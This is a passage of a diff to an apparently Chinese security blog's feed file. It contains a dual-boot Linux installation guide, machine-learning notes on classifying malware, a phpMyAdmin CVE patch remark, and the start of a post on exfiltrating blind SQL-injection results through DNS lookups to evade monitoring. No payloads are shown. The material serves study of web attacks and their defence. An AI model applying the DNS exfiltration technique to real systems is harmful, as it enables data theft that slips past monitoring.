+<p><img src="/blog/2019/08/27/FI20210127/Users\Lkio\AppData\Roaming\Typora\typora-user-images\image-20210127152016552.png" alt="image-20210127152016552"></p>
+<p><img src="/blog/2019/08/27/FI20210127/MyBlog\source_posts\FI20210127\image-20210127152109259.png" alt="image-20210127152109259"></p>
+<p>添加了一个include参数，当$include=true时,仅执行第一次判断$page的合法性，构造的payload将不会进入到urldecode的环节。</p>
+]]></content>
       <categories>
-          
-          <category> 机器学习 </category>
-          
+        <category>WEB安全</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> Python </tag>
-            
-            <tag> Machine learning </tag>
-            
-            <tag> Scikit-learn </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>双系统 Win10下安装Linux（单/双硬盘）</title>
-      <link href="/blog/2021/01/20/%E5%8F%8C%E7%B3%BB%E7%BB%9F%20Win10%E4%B8%8B%E5%AE%89%E8%A3%85Linux%EF%BC%88%E5%8D%95_%E5%8F%8C%E7%A1%AC%E7%9B%98%EF%BC%89/"/>
-      <url>/blog/2021/01/20/%E5%8F%8C%E7%B3%BB%E7%BB%9F%20Win10%E4%B8%8B%E5%AE%89%E8%A3%85Linux%EF%BC%88%E5%8D%95_%E5%8F%8C%E7%A1%AC%E7%9B%98%EF%BC%89/</url>
-      
-        <content type="html"><![CDATA[<h1 id="单硬盘"><a href="#单硬盘" class="headerlink" title="单硬盘"></a>单硬盘</h1><p>出于一些学习需要，笔者需要安装双系统。典型的<strong>Windows+Linux</strong>的双系统组合。<br>这里笔者在Win10环境下安装Linux系统。<br>采用了Centos和Ubuntu两种Linux系统发行版本。<br>分别尝试了 种机型<br><code>Acer-Aspire V15、MI Pro、HP 暗影精灵II、Lenovo IDEALPad等</code></p><a id="more"></a><h2 id="Centos"><a href="#Centos" class="headerlink" title="Centos"></a>Centos</h2><p>准备<kbd>Centos7 iso镜像</kbd>.<br>官网：<br><a href="https://www.centos.org/download/">https://www.centos.org/download/</a><br>阿里源：<br><a href="http://mirrors.aliyun.com/centos/7/isos/x86_64/">http://mirrors.aliyun.com/centos/7/isos/x86_64/ </a><br>首先，准备一个U盘作为系统引导。<br>可以利用UltraISO(<a href="https://ultraiso.en.softonic.com/">https://ultraiso.en.softonic.com/</a>)工具制作引导盘。<br>使用方法：<br><img src="https://img-blog.csdnimg.cn/2019091214021332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="Alt"><br>点击继续试用;<br><img src="https://img-blog.csdnimg.cn/20190912140445964.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>选中文件，打开镜像所在目录，选中镜像;<br><img src="https://img-blog.csdnimg.cn/20190912142702178.png#pic_center" alt="在这里插入图片描述"><br>然后点击启动项，选择写入硬盘映像。其余默认即可。<br><code>Tip:U盘数据会被清空！</code><br>安装前需要进行的准备工作，详见下文Ubuntu中。<br>这边主要针对可能会出现的==invalid pointer==错误提示，提出解决方案。<br>因为路径识别的问题，完整的Centos镜像文件名与U盘名不匹配（这边没有进行深入探究，似乎U盘名称长度受限，一般只能显示到x8处）<br><strong>解决方案</strong>：<br>    <img src="https://img-blog.csdnimg.cn/20190912141901615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center=40x40" alt="在这里插入图片描述">由于当时没有拍照，图源自他处，选择在Install Centos项，按下e。<br>将<code>“linuxefi /images/pxeboot/vmlinuz inst.stage2=hd:LABEL=CentOS\x207\x20x86_64 quiet”</code><br>改为<br><code> linuxefi /images/pxeboot/vmlinuz inst.stage2=hd:LABEL=CentOS\x207\x20x8 quiet</code><br>否则将安装失败。</p><h2 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h2><p>安装过程中分别尝试了<kbd>Ubuntu 14.04</kbd> 与 <kbd>Ubuntu 18.04</kbd><br>这边推荐新手安装较高的版本的Ubuntu（原因见下文），但一般出于稳定性的考虑不会使用最新版本，可以使用笔者采用的18.04版本。</p><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>准备镜像资源<br>官方：<a href="https://ubuntu.com/download">https://ubuntu.com/download</a><br>阿里源：<a href="http://mirrors.aliyun.com/ubuntu-releases/">http://mirrors.aliyun.com/ubuntu-releases</a><br>1.制作U盘引导<br>见上文<code>Centos</code>；</p><p>2.划出安装区<br><img src="https://img-blog.csdnimg.cn/20190912151609516.png#pic_center" alt="在这里插入图片描述"><br>鼠标右击“此电脑”，选中管理；<br><img src="https://img-blog.csdnimg.cn/2019091215173668.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>打开磁盘管理，点击想要进行划分的磁盘；<br><img src="https://img-blog.csdnimg.cn/20190912152027325.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>压缩卷；<br><img src="https://img-blog.csdnimg.cn/20190912152130603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>确保磁盘未使用空间足够的情况下，填入期望划分出的空闲区的大小，笔者划分了80G；<br><img src="https://img-blog.csdnimg.cn/20190912152232924.png#pic_center" alt="在这里插入图片描述"><br>最后会显示一个黑色区域，不要进行建卷操作，我们需要的是一个无格式的分区。</p><p>3.关闭快速启动<br><img src="https://img-blog.csdnimg.cn/20190912144600275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>打开”电源和睡眠设置“；</p><p><img src="https://img-blog.csdnimg.cn/20190912144647264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center=50x50" alt="在这里插入图片描述"><br>选择“其他电源设置”；<br><img src="https://img-blog.csdnimg.cn/20190912144738365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>点击“选择电源按钮的功能”；<br><img src="https://img-blog.csdnimg.cn/2019091214490156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击==更改当前不可用的设置==，勾去==启用快速启动==；</p><p>4.确认UEFI模式</p><blockquote><p>UEFI引导的流程是开机初始化UEFI，然后，直接引导操作系统，进入系统。和传统的BIOS引导相比，UEFI引导少了一道BIOS自检的过程。</p></blockquote><p>见下图，Boot-&gt;Boot Mode</p><p>5.关闭Secure Boot。<br>Secure Boot<br>即安全启动项。</p><blockquote><p>Secure BOOT设计之初作用是防止恶意软件侵入。事实上它能够做到的仅仅是，当电脑引导器被病毒修改之后，它会给出提醒并拒绝启动，避免可能带来的进一步损失。</p></blockquote><p>如果将安全启动项开始，系统会默认引导Windows系统，其他系统系统将无法启动。<br>方法：<br>1.进入BIOS界面（一般是F2或者Fn + F2）；<br>2.选择BOOT项，找到Secure Boot 将其改为 disabled。<br><img src="https://img-blog.csdnimg.cn/20190912145318544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>6.改变引导优先级<br>见上图，选中USB设备将其放置最上方。（即改变value，一般在bios的下方会有介绍，通常是F6）。<br>到这里准备工作基本完毕。</p><h3 id="正式安装Ubuntu系统"><a href="#正式安装Ubuntu系统" class="headerlink" title="正式安装Ubuntu系统"></a>正式安装Ubuntu系统</h3><p><strong>关于分区</strong>：<br>(50G为例)<br>/boot    逻辑分区        400MB（400MB足够，可通用）；<br>/            主分区            20000MB；<br>swap    逻辑分区        8000MB(参照主机内存，一般不超过，笔者是8G内存)；<br>/home    逻辑分区        剩余所有空间，可以放置个人文档、数据。</p><p>由于图片拍摄不便，po百度百科和其他博主图片。<br>图片取自：Windows + Ubuntu 16.04 双系统安装详细教程<br> 链接：<a href="https://blog.csdn.net/flyyufenfei/article/details/79187656">https://blog.csdn.net/flyyufenfei/article/details/79187656</a>（如有侵权，会立即删除，告谢）<br><img src="https://img-blog.csdnimg.cn/20190912150518350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190912150639447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>ubuntu18的界面与这有些不同，但操作类似。<br><img src="https://img-blog.csdnimg.cn/20190912150753225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这边可以两个都不用勾选。<br><img src="https://img-blog.csdnimg.cn/20190912150836287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一般会提示你已经安装Windows系统或其他系统，一定注意选择==其他选项==，选择默认项将会导致格盘，造成已安装系统丢失。<br><img src="https://img-blog.csdnimg.cn/20190912151022494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>找到之前划出的空闲区，采取分区方案分区。<br>要注意的是，==安装启动引导的设备要选择/boot分区对应的标号==。<br>这边不做赘述。</p><h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2><p>笔者分别对六台不同型号的笔记本进行了双系统安装；<br>这里分享一些可能遇到的问题以及解决方案；</p><p><strong>a.安装完Ubuntu后，重启直接进入Windos系统</strong></p><p><strong>解决方案：</strong></p><p>重新启动，进入BIOS界面，在启动优先级处将Ubuntu系统放置在第一位，这样可以进入Ubuntu系统；<br>或者，在Windos系统下引导菜单；<br><img src="https://img-blog.csdnimg.cn/20190912153328303.png#pic_center" alt="在这里插入图片描述"><br>打开“此电脑”属性；<br><img src="https://img-blog.csdnimg.cn/20190912153413295.png#pic_center" alt="在这里插入图片描述"><br>点击“高级系统设置”；<br><img src="https://img-blog.csdnimg.cn/2019091215350315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>设置“启动和故障恢复”，点击“设置”；<br><img src="https://img-blog.csdnimg.cn/20190912153556974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>勾选“显示操作系统列表的时间”，默认30s即可；<br>这样重启后，会发现出现系统引导菜单，可以进行系统选择；</p><p><strong>b.BIOS下找不到Ubuntu系统</strong></p><p><strong>解决方案：</strong></p><p>重启，进入BooT Menu（一般为F12），查看是否有Ubuntu系统引导；</p><p><strong>c.Ubuntu14 无线网卡问题</strong></p><p><strong>解决方案:</strong></p><p>这就是上文推荐安装Ubuntu18的原因了，在Ubuntu14种无线网卡驱动存在问题，需要先进行有线连接更新驱动，但对于小米用户（出于轻便设计考虑，去掉了宽带口）似乎不可行，但在Ubuntu18上无线网卡驱动是正常的，可以像Windows端一样轻松搜索Wifi。</p><p><strong>d.Ubuntu /boot引导问题</strong></p><p><strong>解决方案：</strong></p><p>我在为朋友的一台较新的笔记本安装双系统时，对空闲区进行分区，采用/boot引导会提示不可行，这时候需要采用efi格式，即将”ext4…”一栏下拉，选择efi即可，引导分区选择efi分区对应标号。</p><p><strong>e. Ubuntu 引导无法被识别</strong></p><p><strong>解决方案:</strong></p><p>这是笔者在安装过程中碰到最困惑的一个问题，笔记本是较老的型号预留有光驱位（放盘），尝试了各种姿势安装Ubuntu14都无法找到引导；<br>经过一系列尝试，终于找到了一个能进入Ubuntu的姿势；<br>首先需要将固态盘放置在笔记本内，而不是光驱位，让BIOS能读取到固态硬盘。因为这样的笔记本在BIOS中只会读取到一个磁盘，即放置在内部的（很奇怪）；<br>将Ubuntu18（Ubuntu14无用）系统装在固态盘即系统盘上，这时候还是无法找到引导；<br>利用工具easyBCD添加引导grub2，自动加载即可，按照上文打开引导列表，重启会发现一个Linux系统引导，Enter进入，会提示“请插入Windows光盘…”这是正常的，这时候按下Escape（Esc）,会发现显示一个固态盘的分区界面（Boot Option Menu）。<br><img src="https://img-blog.csdnimg.cn/20190912161440852.png#pic_center" alt="在这里插入图片描述"><br>因为我们只安装了两个系统，并且都在固态盘上，显然这个不知名设备正是我们的Ubuntu系统，选择进入，成功进入Ubuntu。</p><h1 id="双硬盘"><a href="#双硬盘" class="headerlink" title="双硬盘"></a>双硬盘</h1><p>双硬盘安装即固械混合安装系统，是将Ubuntu系统的引导分区\boot存放在固态硬盘（系统盘C盘），其他分区放置在机械硬盘（数据盘）。<br>所以，操作与单硬盘基本类似，不同在于，我们需要在系统盘上划出400MB以上的空闲区作为引导分区。<br>可参考：<br><a href="https://blog.csdn.net/m0_37857300/article/details/78930773">https://blog.csdn.net/m0_37857300/article/details/78930773</a></p>]]></content>
-      
-      
+      <tags>
+        <tag>Web</tag>
+        <tag>PhpMyadmin</tag>
+        <tag>PHP</tag>
+        <tag>CVE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>机器学习——分类问题</title>
+    <url>/blog/2021/01/20/MachineLearning1/</url>
+    <content><![CDATA[<p>​    近期，准备通过机器学习来进行恶意代码的分检，需要学习相关知识，故做了一些机器学习的笔记。</p>
+<p>​    首先明确了这是一个典型的二分类问题，分为Malicious(恶意)和Benign(良性)两类。通过分类算法对选取的特征向量进行训练测试，实现对恶意软件和良性软件的区分。</p>
+<a id="more"></a>
+
+<h1 id="机器学习——分类问题"><a href="#机器学习——分类问题" class="headerlink" title="机器学习——分类问题"></a>机器学习——分类问题</h1><h2 id="KNN-K近邻算法"><a href="#KNN-K近邻算法" class="headerlink" title="KNN K近邻算法"></a>KNN K近邻算法</h2><h3 id="一般步骤："><a href="#一般步骤：" class="headerlink" title="一般步骤："></a>一般步骤：</h3><ol>
+<li><p>计算距离</p>
+<p>欧式距离</p>
+</li>
+<li><p>选取近邻</p>
+<p>按距离升序，选K个样本点</p>
+</li>
+<li><p>分类决策</p>
+<p>根据K个近邻归属类别，采用多数表决，由K个点来投票决定测试对象归为哪一类</p>
+</li>
+</ol>
+<h3 id="关于K的取值"><a href="#关于K的取值" class="headerlink" title="关于K的取值"></a>关于K的取值</h3><p>将很大程度影响到准确率。</p>
+<h3 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h3><blockquote>
+<p>step1</p>
+<blockquote>
+<p>准备数据，分析数据，预处理</p>
+</blockquote>
+<p>step2</p>
+<blockquote>
+<p>划分训练集和测试集</p>
+</blockquote>
+<p>step3 </p>
+<blockquote>
+<p>计算未知样本和训练集样本的距离</p>
+</blockquote>
+<p>step4</p>
+<blockquote>
+<p>选取K值</p>
+</blockquote>
+<p>step5</p>
+<blockquote>
+<p>多数表决</p>
+</blockquote>
+<blockquote>
+<blockquote>
+<p><strong>电影分类问题</strong>(简单问题)</p>
+<ul>
+<li><p>数据集</p>
+<img src="/blog/2021/01/20/MachineLearning1/dataSet.png" style="zoom:50%;">
+
+<table>
+<thead>
+<tr>
+<th align="center">FIGHT（打斗次数）</th>
+<th align="center">KISS（接吻次数）</th>
+<th align="center">Label（类型）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">3</td>
+<td align="center">104</td>
+<td align="center">R</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td align="center">100</td>
+<td align="center">R</td>
+</tr>
+<tr>
+<td align="center">1</td>
+<td align="center">81</td>
+<td align="center">R</td>
+</tr>
+<tr>
+<td align="center">101</td>
+<td align="center">10</td>
+<td align="center">A</td>
+</tr>
+<tr>
+<td align="center">99</td>
+<td align="center">5</td>
+<td align="center">A</td>
+</tr>
+<tr>
+<td align="center">98</td>
+<td align="center">2</td>
+<td align="center">A</td>
+</tr>
+<tr>
+<td align="center">18</td>
+<td align="center">90</td>
+<td align="center">?</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<img src="/blog/2021/01/20/MachineLearning1/特征向量.png" style="zoom:50%;">
+
+<p>绘制特征向量关系图，以便观察。</p>
+<p>More …</p>
+<p><strong>约会网站配对数据</strong></p>
+<p><em>稍复杂的数据集</em></p>
+<ul>
+<li><p>三个特征值</p>
+<ol>
+<li><p>出行里程</p>
+</li>
+<li><p>娱乐时间占比</p>
+</li>
+<li><p>每周吃冰激凌数量</p>
+</li>
+</ol>
+<img src="/blog/2021/01/20/MachineLearning1/dataSet2.png" style="zoom:50%;">
+
+<p>部分数据展示，共1000行数据。    </p>
+<p>好感度作为Label；</p>
+<table>
+<thead>
+<tr>
+<th align="center">Mileage(里程数)</th>
+<th align="center">Entertainment(娱乐)</th>
+<th align="center">ICE Cream(冰激凌)</th>
+<th align="center">Impression（感官）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">40920</td>
+<td align="center">8.326976</td>
+<td align="center">0.953952</td>
+<td align="center">LargeDoses</td>
+</tr>
+<tr>
+<td align="center">14488</td>
+<td align="center">7.153469</td>
+<td align="center">0.805124</td>
+<td align="center">SmallDoses</td>
+</tr>
+<tr>
+<td align="center">26052</td>
+<td align="center">1.441871</td>
+<td align="center">0.428964</td>
+<td align="center">DidntLike</td>
+</tr>
+<tr>
+<td align="center">…</td>
+<td align="center">…</td>
+<td align="center">…</td>
+<td align="center">…</td>
+</tr>
+</tbody></table>
+<p>根据特征向量关系绘图</p>
+<ol>
+<li><img src="/blog/2021/01/20/MachineLearning1/1.png" alt="image-20210113192420682" style="zoom:50%;"></li>
+<li><img src="/blog/2021/01/20/MachineLearning1/2.png" alt="image-20210113192520399" style="zoom:50%;"></li>
+<li><img src="/blog/2021/01/20/MachineLearning1/3.png" alt="image-20210113192654939" style="zoom:50%;">
+</li>
+</ol>
+</li>
+</ul>
+</blockquote>
+<p><strong>归一化</strong></p>
+<blockquote>
+<p>欧式距离：<em>d</em>(<em>x</em>,<em>y</em>)=(<em>x</em>1−<em>y</em>1)2+(<em>x</em>2−<em>y</em>2)2+…+(<em>x**n</em>−<em>y**n</em>)2=<em>i</em>=1∑<em>n</em>(<em>x**i</em>−<em>y**i</em>)2</p>
+<ol>
+<li><p>0-1标准化</p>
+<p>为了数据处理方便提出来的，把数据映射到0～1范围之内处理</p>
+<p>公式：x’ = (x - X_min) / (X_max - X_min)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[[4.0920000e+04 8.3269760e+00 9.5395200e-01]</span><br><span class="line"> [1.4488000e+04 7.1534690e+00 1.6739040e+00]</span><br><span class="line"> [2.6052000e+04 1.4418710e+00 8.0512400e-01]</span><br><span class="line"> ...</span><br><span class="line"> [2.6575000e+04 1.0650102e+01 8.6662700e-01]</span><br><span class="line"> [4.8111000e+04 9.1345280e+00 7.2804500e-01]</span><br><span class="line"> [4.3757000e+04 7.8826010e+00 1.3324460e+00]]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[[0.44832535 0.39805139 0.56233353]</span><br><span class="line"> [0.15873259 0.34195467 0.98724416]</span><br><span class="line"> [0.28542943 0.06892523 0.47449629]</span><br><span class="line"> ...</span><br><span class="line"> [0.29115949 0.50910294 0.51079493]</span><br><span class="line"> [0.52711097 0.43665451 0.4290048 ]</span><br><span class="line"> [0.47940793 0.3768091  0.78571804]]</span><br></pre></td></tr></table></figure>
+
+<p>不同特征数量级一致，权重降低，线性变化，位序不会发生变化。</p>
+</li>
+<li><p>Z-score标准化</p>
+</li>
+<li><p>sigmoid压缩法</p>
+</li>
+</ol>
+</blockquote>
+<p>继续处理这个问题</p>
+<blockquote>
+<ul>
+<li><p>划分训练集和测试集</p>
+<p>先获取总规模，按一定百分比取训练集规模</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = <span class="number">0.8</span></span><br><span class="line">dataSize = normalSet.shape[<span class="number">0</span>]</span><br><span class="line">trainSize = <span class="built_in">int</span>(m*dataSize)</span><br><span class="line">testSize = <span class="built_in">int</span>((<span class="number">1</span>-m)*dataSize)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>KNN算法</p>
+<p>取K = 5；</p>
+<p>数据集总行数 1000<br>错误率 : 0.05527638190954774</p>
+<p>K = 6;</p>
+<p>错误率 : 0.06030150753768844</p>
+<p>…</p>
+<table>
+<thead>
+<tr>
+<th align="center">划分比例（训练：测试）</th>
+<th align="center">K</th>
+<th align="center">准确率</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">8：2</td>
+<td align="center">5</td>
+<td align="center">99.45%</td>
+</tr>
+<tr>
+<td align="center">8：2</td>
+<td align="center">6</td>
+<td align="center">99.44%</td>
+</tr>
+<tr>
+<td align="center">7：3</td>
+<td align="center">6</td>
+<td align="center">99.96%</td>
+</tr>
+<tr>
+<td align="center">6：4</td>
+<td align="center">6</td>
+<td align="center">99.96%</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+</blockquote>
+</blockquote>
+</blockquote>
+<h1 id="敏感权限"><a href="#敏感权限" class="headerlink" title="敏感权限"></a>敏感权限</h1><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><img src="/blog/2021/01/20/MachineLearning1/algorithm.png" alt="image-20210113225521492" style="zoom: 50%;">
+
+<h3 id="权限特征"><a href="#权限特征" class="headerlink" title="权限特征"></a>权限特征</h3><h3 id="理论研究"><a href="#理论研究" class="headerlink" title="理论研究"></a>理论研究</h3><p>通过反编译、解压缩等多种途径即可获得应用程序的权限信息，再利用系统权限的调用能够间接反映出应用程序行为特征的特性，将系统权限申请与恶意应用的行为对应上，达到分类的目标和效果。</p>
+<h3 id="KNN"><a href="#KNN" class="headerlink" title="KNN"></a>KNN</h3><blockquote>
+<p><strong>Details</strong></p>
+<blockquote>
+<p>Pandas</p>
+<ul>
+<li><p>iloc</p>
+<p>根据数字型的行/列标签来索引数据</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X &#x3D; trainData.iloc[:4000,0:88]</span><br><span class="line">Y &#x3D; testData.iloc[:2000,:88]</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>K值</p>
+<p>500</p>
+<table>
+<thead>
+<tr>
+<th align="center">K</th>
+<th align="center">P</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">500</td>
+<td align="center">99.82400</td>
+</tr>
+<tr>
+<td align="center">100</td>
+<td align="center">99.82400</td>
+</tr>
+<tr>
+<td align="center">2000</td>
+<td align="center">99.82400</td>
+</tr>
+</tbody></table>
+<p>欧式距离情况下，K个label全都是0</p>
+</li>
+</ul>
+</blockquote>
+</blockquote>
+<h3 id="随机森林"><a href="#随机森林" class="headerlink" title="随机森林"></a>随机森林</h3><blockquote>
+<p><strong>决策树</strong></p>
+<blockquote>
+<p><strong>决策树是一种有监督的机器学习算法，该方法可以用于解决分类和回归问题。决策树可以简单地理解为达到某一特定结果的一系列决策。</strong></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;class sklearn.ensemble.RandomForestClassifier(n_estimators&#x3D;10, criterion&#x3D;&#39;gini&#39;, max_depth&#x3D;None, min_samples_split&#x3D;2, min_samples_leaf&#x3D;1, min_weight_fraction_leaf&#x3D;0.0, max_features&#x3D;’auto’, max_leaf_nodes&#x3D;None, min_impurity_decrease&#x3D;0.0, min_impurity_split&#x3D;None, bootstrap&#x3D;True, oob_score&#x3D;False, n_jobs&#x3D;1, random_state&#x3D;None, verbose&#x3D;0, warm_start&#x3D;False, class_weight&#x3D;None)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>n_estimators</strong> : integer, optional (default=10)  整数，可选择(默认值为10)。</li>
+</ul>
+<blockquote>
+<p>The number of trees in the forest.  </p>
+<p> 森林里（决策）树的数目。</p>
+</blockquote>
+<ul>
+<li></li>
+</ul>
+</blockquote>
+<p>显示算法，没有训练，而是作比较。</p>
+]]></content>
       <categories>
-          
-          <category> 杂记 </category>
-          
+        <category>机器学习</category>
       </categories>
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>OOB之DNS隧道利用</title>
-      <link href="/blog/2021/01/07/OOB%E4%B9%8BDNS%E9%9A%A7%E9%81%93%E5%88%A9%E7%94%A8/"/>
-      <url>/blog/2021/01/07/OOB%E4%B9%8BDNS%E9%9A%A7%E9%81%93%E5%88%A9%E7%94%A8/</url>
-      
-        <content type="html"><![CDATA[<p>​    在对于注入中，存在无回显的情况，这时候通常使用Blind SQL进行猜解，利用这种方式获取信息，比较麻烦，并且容易因为频繁的数据请求导致ip被BAN。<br>​    OOB通过另一种方式来确认和利用盲注漏洞带外通道技术通常需要脆弱的实体来生成带外的TCP/UDP/ICMP请求，然后，攻击者可以通过这个请求来提取数据。一次OOB攻击能够成功逃避监控，绕过防火墙且能更好的隐藏自己。</p><a id="more"></a><h1 id="相关背景"><a href="#相关背景" class="headerlink" title="相关背景"></a>相关背景</h1><h2 id="1-什么是OOB"><a href="#1-什么是OOB" class="headerlink" title="1. 什么是OOB"></a>1. 什么是OOB</h2><p>OOB即，带外通道技术。<br>在对于注入中，存在无回显的情况，这时候通常使用Blind SQL进行猜解，利用这种方式获取信息，比较麻烦，并且容易因为频繁的数据请求导致ip被BAN。<br>OOB通过另一种方式来确认和利用盲注漏洞带外通道技术通常需要脆弱的实体来生成带外的TCP/UDP/ICMP请求，然后，攻击者可以通过这个请求来提取数据。一次OOB攻击能够成功逃避监控，绕过防火墙且能更好的隐藏自己。<br>常见的方式是HTTP、ICMP、DNS，ICMP隧道一般会进行防御，TCP在甲方中会有严格的防火墙控制端口，HTTP在甲方中一般也会有严格且完整的监控和阻断机制，DNS隧道在当前环境下，由于需要解析，不会对其进行拦截。利用访问域名，携带信息。<br>所以可以将select到的数据发送给一个url，利用dns解析产生的记录日志来查看数据。</p><h2 id="2-DNSLOG"><a href="#2-DNSLOG" class="headerlink" title="2. DNSLOG"></a>2. DNSLOG</h2><p>Dnslog就是存储在DNS Server上的域名信息，它记录着用户对域名<a href="http://www.test.com、t00ls.com.等的访问信息./">www.test.com、t00ls.com.等的访问信息。</a><br><img src="https://img-blog.csdnimg.cn/20210106155146376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="DNS查询原理图"></p><blockquote><p><strong>PS：好久以前的笔记了，这张图片忘了出处了，如有冒犯，侵删，抱歉。</strong></p></blockquote><p>如在访问<a href="http://www.scholar.com时/">www.scholar.com时</a><br>流程如下：</p><ol><li>   客户端向一个域名发起请求，首先查询本地DNS；</li><li>   本地查询无果，向根域发起查询请求；</li><li>   根域查询返回.com服务器地址，继续请求.com DNS服务器;</li><li>   .com服务器查询返回.scholar.com地址，继续请求.scholar.com DNS服务器；</li><li>   最后查询www服务器，返回IP。</li></ol><p>可以发现其中scholar 域名服务器是可控的，我们只需要搭建一个scholar DNS服务器，并将要盲打或盲注的回显，放到自己域名的二级甚至三级域名上去请求，就可以通过DNS解析日志来获取到它们。</p><h3 id="2-1-DNSlog工具"><a 